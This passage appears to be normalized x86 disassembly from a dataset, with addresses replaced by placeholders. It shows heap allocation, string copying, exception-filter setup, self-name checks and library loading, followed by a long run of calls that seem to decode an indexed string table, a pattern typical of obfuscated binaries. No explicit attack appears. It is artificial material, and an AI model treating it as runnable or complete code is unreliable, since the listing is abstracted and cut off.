mov [ ebx + 0x1c ] eax
inc [ eax ]
lea esi [ ebx + 0x20 ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ ebp - 0x7c ] esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x4 ] eax
inc [ eax ]
mov esi [ GetProcessHeap@IAT ]
push 0x4
push edi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x30 ] edi
mov [ ebx + 0x34 ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x3c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x3a
call sub_1000a6f0
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
mov [ ebx + 0x3c ] eax
inc [ eax ]
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov [ ebx ] ecx
mov esi [ eax + 0x4 ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x110
call sub_1000a6f0
mov ecx [ ebx + 0xc ]
cmp ecx edi
je r-xdata
push esi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x48 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push edx
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x14 ] edi
mov esi [ esi + 0x14 ]
cmp esi 0x6
ja r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push esi
push edx
push eax
mov [ ebx + 0xc ] eax
call sub_10078600
mov esi [ ebp - 0x50 ]
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0xc ] edi
mov esi [ ebp - 0x50 ]
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x70
call sub_1000a6f0
mov [ ebx + 0x14 ] esi
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x48 ]
push esi
push ecx
push eax
mov [ ebx + 0x10 ] eax
call sub_10078600
mov esi [ ebp - 0x50 ]
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0x10 ] edi
mov eax [ esi + 0x10 ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
push 0x4
push edi
mov [ ebp - 0x4c ] edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapAlloc@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x48 ] eax
push 0x4
push edi
mov [ ebp - 0x5c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x58 ] eax
push 0x4
push edi
mov [ ebp - 0x64 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x60 ] eax
push 0x4
push edi
mov [ ebp - 0x6c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x68 ] eax
push 0x4
push edi
mov [ ebp - 0x74 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x70
call sub_1000a6f0
jmp r-xdata
jmp [ eax * 4 + jump_table_10032e70 ]
inc [ eax ]
mov [ ebp - 0x70 ] eax
mov eax [ ebx + 0x14 ]
cmp eax 0x6
ja r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi [ ebp - 0x70 ]
dec [ esi ]
cmp [ esi ] edi
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x9b
call sub_1000a6f0
jmp r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x54 ]
call sub_1001cc00
push eax
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_10026770
mov edi esi
mov [ ebp - 0x4 ] 0x9
call sub_10065690
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x84 ]
call sub_10007340
mov ebx eax
lea edi [ ebp - 0x5c ]
call sub_1005ac40
mov edi esi
call sub_10014890
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x9c ]
call sub_10016070
mov edi eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_10002d90
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x9
call sub_10010040
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x94 ]
call sub_1000e560
mov edi eax
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xc
call sub_10002d90
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x9
call sub_10010040
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x8c ]
call sub_10054a50
mov edi eax
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xd
call sub_10002d90
lea esi [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x9
call sub_10010040
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov esi [ HeapFree@IAT ]
mov ecx [ ebp - 0x74 ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x69
lea edx [ ebp - 0x4c ]
push edx
lea edi [ ebx + 0x18 ]
call sub_10026770
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x95
call sub_1000a6f0
mov ebx [ ebp - 0x78 ]
jmp r-xdata
mov edi [ ebp - 0x7c ]
lea ebx [ ebp - 0x5c ]
call sub_1005ac40
mov ebx [ ebp - 0x78 ]
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x19
jmp r-xdata
lea edi [ ebp - 0x64 ]
lea esi [ ebx + 0x28 ]
call sub_10002d90
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xc7
jmp r-xdata
lea edi [ ebp - 0x6c ]
lea esi [ ebx + 0x30 ]
call sub_10002d90
jmp r-xdata
xor edi edi
lea edi [ ebp - 0x74 ]
lea esi [ ebx + 0x38 ]
call sub_10002d90
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x60 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x6c ]
cmp ecx edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapFree@IAT ]
push eax
call esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
call sub_1000a6f0
mov eax [ ebp - 0x58 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x68 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x48 ]
dec [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x5c ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x60 ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov esi ecx
call sub_10020880
mov esi [ HeapFree@IAT ]
mov eax [ ebp - 0x58 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
call sub_10054700
mov ecx [ ebp - 0x4c ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov ecx [ ebp - 0x48 ]
sub_10032ea0
push ebp
mov ebp esp
sub esp 0xfe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
mov edx [ rw-data ]
push edx
call [ SetUnhandledExceptionFilter@IAT ]
mov eax [ rw-data ]
push eax
call [ SetErrorMode@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_1005b4d5
add esp 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
push sub_1006b8c0
call [ SetUnhandledExceptionFilter@IAT ]
push 0x8003
mov [ rw-data ] eax
call [ SetErrorMode@IAT ]
mov [ rw-data ] eax
push 0x104
lea eax [ ebp - 0xfe0 ]
push eax
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
lea ecx [ ebp - 0xfe0 ]
push ecx
call [ PathStripPathW@IAT ]
lea edx [ ebp - 0x690 ]
mov eax 0xdc
call sub_1001bb80
push edx
lea eax [ ebp - 0xfe0 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x690 ]
push ecx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push edi
push 0x6720
mov [ rw-data ] esi
call sub_10062fc5
mov esi eax
add esp 0x4
lea edi [ ebp - 0x310 ]
mov eax 0x6f
mov [ rw-data ] esi
call sub_10057840
lea edi [ ebp - 0x944 ]
mov eax 0x49
call sub_10057840
lea edi [ ebp - 0x60 ]
mov eax 0x98
call sub_10057840
lea edi [ ebp - 0x90 ]
mov eax 0xde
call sub_10057840
lea edi [ ebp - 0x268 ]
mov eax 0x10b
call sub_10057840
lea edi [ ebp - 0x62c ]
mov eax 0x1d
call sub_10057840
lea edi [ ebp - 0x81c ]
mov eax 0xfd
call sub_10057840
lea edi [ ebp - 0x8d0 ]
mov eax 0x11b
call sub_10057840
lea edi [ ebp - 0x3d0 ]
mov eax 0x44
call sub_10057840
lea edi [ ebp - 0x91c ]
mov eax 0x158
call sub_10057840
lea edi [ ebp - 0xc0c ]
mov eax 0x120
call sub_10057840
lea edi [ ebp - 0x59c ]
mov eax 0x110
call sub_10057840
lea edi [ ebp - 0xb5c ]
mov eax 0x75
call sub_10057840
lea edi [ ebp - 0xc68 ]
mov eax 0x124
call sub_10057840
lea edi [ ebp - 0x9bc ]
mov eax 0x52
call sub_10057840
lea edi [ ebp - 0x9e4 ]
mov eax 0x100
call sub_10057840
lea edi [ ebp - 0x608 ]
mov eax 0x126
call sub_10057840
lea edi [ ebp - 0x7f8 ]
mov eax 0x122
call sub_10057840
lea edi [ ebp - 0xa34 ]
mov eax 0xa7
call sub_10057840
lea edi [ ebp - 0x7b0 ]
mov eax 0x141
call sub_10057840
lea edi [ ebp - 0x888 ]
mov eax 0x80
call sub_10057840
lea edi [ ebp - 0x2f4 ]
mov eax 0xef
call sub_10057840
lea edi [ ebp - 0x994 ]
mov eax 0x2f
call sub_10057840
lea edi [ ebp - 0x720 ]
mov eax 0xb4
call sub_10057840
lea edi [ ebp - 0xdd8 ]
mov eax 0x2c
call sub_10057840
lea edi [ ebp - 0xb30 ]
mov eax 0x1b
call sub_10057840
lea edi [ ebp - 0x4d0 ]
mov eax 0x8a
call sub_10057840
lea edi [ ebp - 0xcc8 ]
mov eax 0x137
call sub_10057840
lea edi [ ebp - 0x650 ]
mov eax 0x17
call sub_10057840
lea edi [ ebp - 0x18 ]
mov eax 0x5f
call sub_10057840
lea edi [ ebp - 0xd30 ]
mov eax 0x77
call sub_10057840
lea edi [ ebp - 0x410 ]
mov eax 0x70
call sub_10057840
lea edi [ ebp - 0x188 ]
mov eax 0xa5
call sub_10057840
lea edi [ ebp - 0x840 ]
mov eax 0x5c
call sub_10057840
lea edi [ ebp - 0x30 ]
mov eax 0x22
call sub_10057840
lea edi [ ebp - 0xa0c ]
mov eax 0xc8
call sub_10057840
lea edi [ ebp - 0x16c ]
mov eax 0x4d
call sub_10057840
lea edi [ ebp - 0x96c ]
mov eax 0xc3
call sub_10057840
lea edi [ ebp - 0xda0 ]
mov eax 0xf5
call sub_10057840
lea edi [ ebp - 0x490 ]
mov eax 0xb0
call sub_10057840
lea edi [ ebp - 0x3f0 ]
mov eax 0x11f
call sub_10057840
lea edi [ ebp - 0x864 ]
mov eax 0xdd
call sub_10057840
lea edi [ ebp - 0x5e4 ]
mov eax 0xa2
call sub_10057840
lea edi [ ebp - 0x4f0 ]
mov eax 0x56
call sub_10057840
lea edi [ ebp - 0xa5c ]
mov eax 0x3
call sub_10057840
lea edi [ ebp - 0x78 ]
mov eax 0x14d
call sub_10057840
lea edi [ ebp - 0x118 ]
mov eax 0x88
call sub_10057840
lea edi [ ebp - 0xb04 ]
mov eax 0xe5
call sub_10057840
lea edi [ ebp - 0x48 ]
mov eax 0x45
call sub_10057840
lea edi [ ebp - 0x1dc ]
mov eax 0xb9
call sub_10057840
lea edi [ ebp - 0x330 ]
mov eax 0x53
call sub_10057840
lea edi [ ebp - 0x2bc ]
mov eax 0x12a
call sub_10057840
lea edi [ ebp - 0x554 ]
mov eax 0x9d
call sub_10057840
lea edi [ ebp - 0xad8 ]
mov eax 0x10e
call sub_10057840
lea edi [ ebp - 0xc4 ]
mov eax 0x113
call sub_10057840
lea edi [ ebp - 0x674 ]
mov eax 0x127
call sub_10057840
lea edi [ ebp - 0x150 ]
mov eax 0x133
call sub_10057840
lea edi [ ebp - 0x390 ]
mov eax 0xa0
call sub_10057840
lea edi [ ebp - 0x350 ]
mov eax 0xc1
call sub_10057840
lea edi [ ebp - 0xc98 ]
mov eax 0xe3
call sub_10057840
lea edi [ ebp - 0xcf8 ]
mov eax 0x156
call sub_10057840
lea edi [ ebp - 0x430 ]
mov eax 0x134
call sub_10057840
lea edi [ ebp - 0xd68 ]
mov eax 0xad
call sub_10057840
lea edi [ ebp - 0x284 ]
mov eax 0x4f
call sub_10057840
lea edi [ ebp - 0x578 ]
mov eax 0x47
call sub_10057840
lea edi [ ebp - 0x230 ]
mov eax 0x102
call sub_10057840
lea edi [ ebp - 0x5c0 ]
mov eax 0x85
call sub_10057840
lea edi [ ebp - 0x6b4 ]
mov eax 0x2e
call sub_10057840
lea edi [ ebp - 0x1c0 ]
mov eax 0x10c
call sub_10057840
lea edi [ ebp - 0xb88 ]
mov eax 0x43
call sub_10057840
lea edi [ ebp - 0xa84 ]
mov eax 0x42
call sub_10057840
lea edi [ ebp - 0xbe0 ]
mov eax 0xbe
call sub_10057840
lea edi [ ebp - 0x1f8 ]
mov eax 0x107
call sub_10057840
lea edi [ ebp - 0x450 ]
mov eax 0x129
call sub_10057840
lea edi [ ebp - 0x7d4 ]
mov eax 0xc9
call sub_10057840
lea edi [ ebp - 0x8ac ]
mov eax 0x41
call sub_10057840
lea edi [ ebp - 0x1a4 ]
mov eax 0x12d
call sub_10057840
lea edi [ ebp - 0x4b0 ]
mov eax 0x125
call sub_10057840
lea edi [ ebp - 0xc38 ]
mov eax 0xd6
call sub_10057840
lea edi [ ebp - 0x510 ]
mov eax 0x115
call sub_10057840
lea edi [ ebp - 0x214 ]
mov eax 0xe4
call sub_10057840
lea edi [ ebp - 0x2d8 ]
mov eax 0x46
call sub_10057840
lea edi [ ebp - 0x8f4 ]
mov eax 0x29
call sub_10057840
lea edi [ ebp - 0xe0 ]
mov eax 0xfc
call sub_10057840
lea edi [ ebp - 0x370 ]
mov eax 0x7
call sub_10057840
lea edi [ ebp - 0x24c ]
mov eax 0x139
call sub_10057840
lea edi [ ebp - 0x530 ]
mov eax 0x5b
call sub_10057840
lea edi [ ebp - 0x470 ]
mov eax 0x14c
call sub_10057840
lea edi [ ebp - 0x3b0 ]
mov eax 0x89
call sub_10057840
lea edi [ ebp - 0x78c ]
mov eax 0x21
call sub_10057840
lea edi [ ebp - 0x2a0 ]
mov eax 0x1e
call sub_10057840
lea edi [ ebp - 0xfc ]
mov eax 0x62
call sub_10057840
lea edi [ ebp - 0xa8 ]
mov eax 0x7c
call sub_10057840
lea edi [ ebp - 0x744 ]
mov eax 0x14b
call sub_10057840
lea edi [ ebp - 0x768 ]
mov eax 0x58
call sub_10057840
lea edi [ ebp - 0xbb4 ]
mov eax 0x4a
call sub_10057840
lea edi [ ebp - 0x6d8 ]
mov eax 0x96
call sub_10057840
lea edi [ ebp - 0x6fc ]
mov eax 0xd4
call sub_10057840
lea edi [ ebp - 0x134 ]
mov eax 0x146
call sub_10057840
lea edi [ ebp - 0xaac ]
mov eax 0xf8
call sub_10057840
lea eax [ ebp - 0x310 ]
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x310 ]
push edx
push esi
call sub_10078600
lea eax [ ebp - 0x944 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x944 ]
push eax
lea ecx [ esi + 0x108 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x60 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x60 ]
push edx
lea eax [ esi + 0x210 ]
push eax
call sub_10078600
lea eax [ ebp - 0x90 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x90 ]
push ecx
lea edx [ esi + 0x318 ]
push edx
call sub_10078600
lea eax [ ebp - 0x268 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x268 ]
push eax
lea ecx [ esi + 0x420 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x62c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x62c ]
push edx
lea eax [ esi + 0x528 ]
push eax
call sub_10078600
lea eax [ ebp - 0x81c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x81c ]
push ecx
lea edx [ esi + 0x630 ]
push edx
call sub_10078600
lea eax [ ebp - 0x8d0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x8d0 ]
push eax
lea ecx [ esi + 0x738 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x3d0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3d0 ]
push edx
lea eax [ esi + 0x840 ]
push eax
call sub_10078600
lea eax [ ebp - 0x91c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x91c ]
push ecx
lea edx [ esi + 0x948 ]
push edx
call sub_10078600
lea eax [ ebp - 0xc0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc0c ]
push eax
lea ecx [ esi + 0xa50 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x59c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x59c ]
push edx
lea eax [ esi + 0xb58 ]
push eax
call sub_10078600
lea eax [ ebp - 0xb5c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb5c ]
push ecx
lea edx [ esi + 0xc60 ]
push edx
call sub_10078600
lea eax [ ebp - 0xc68 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc68 ]
push eax
lea ecx [ esi + 0xd68 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x9bc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x9bc ]
push edx
lea eax [ esi + 0xe70 ]
push eax
call sub_10078600
lea eax [ ebp - 0x9e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x9e4 ]
push ecx
lea edx [ esi + 0xf78 ]
push edx
call sub_10078600
lea eax [ ebp - 0x608 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x608 ]
push eax
lea ecx [ esi + 0x1080 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x7f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x7f8 ]
push edx
lea eax [ esi + 0x1188 ]
push eax
call sub_10078600
lea eax [ ebp - 0xa34 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa34 ]
push ecx
lea edx [ esi + 0x1290 ]
push edx
call sub_10078600
lea eax [ ebp - 0x7b0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x7b0 ]
push eax
lea ecx [ esi + 0x1398 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x888 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x888 ]
push edx
lea eax [ esi + 0x14a0 ]
push eax
call sub_10078600
lea eax [ ebp - 0x2f4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2f4 ]
push ecx
lea edx [ esi + 0x15a8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x994 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x994 ]
push eax
lea ecx [ esi + 0x16b0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x720 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x720 ]
push edx
lea eax [ esi + 0x17b8 ]
push eax
call sub_10078600
lea eax [ ebp - 0xdd8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xdd8 ]
push ecx
lea edx [ esi + 0x18c0 ]
push edx
call sub_10078600
lea eax [ ebp - 0xb30 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xb30 ]
push eax
lea ecx [ esi + 0x19c8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x4d0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4d0 ]
push edx
lea eax [ esi + 0x1ad0 ]
push eax
call sub_10078600
lea eax [ ebp - 0xcc8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcc8 ]
push ecx
lea edx [ esi + 0x1bd8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x650 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x650 ]
push eax
lea ecx [ esi + 0x1ce0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x18 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x18 ]
push edx
lea eax [ esi + 0x1de8 ]
push eax
call sub_10078600
lea eax [ ebp - 0xd30 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xd30 ]
push ecx
lea edx [ esi + 0x1ef0 ]
push edx
call sub_10078600
lea eax [ ebp - 0x410 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x410 ]
push eax
lea ecx [ esi + 0x1ff8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x188 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x188 ]
push edx
lea eax [ esi + 0x2100 ]
push eax
call sub_10078600
lea eax [ ebp - 0x840 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x840 ]
push ecx
lea edx [ esi + 0x2208 ]
push edx
call sub_10078600
lea eax [ ebp - 0x30 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x2310 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xa0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa0c ]
push edx
lea eax [ esi + 0x2418 ]
push eax
call sub_10078600
lea eax [ ebp - 0x16c ]
add esp 0xc
lea edx [ eax + 0x1 ]
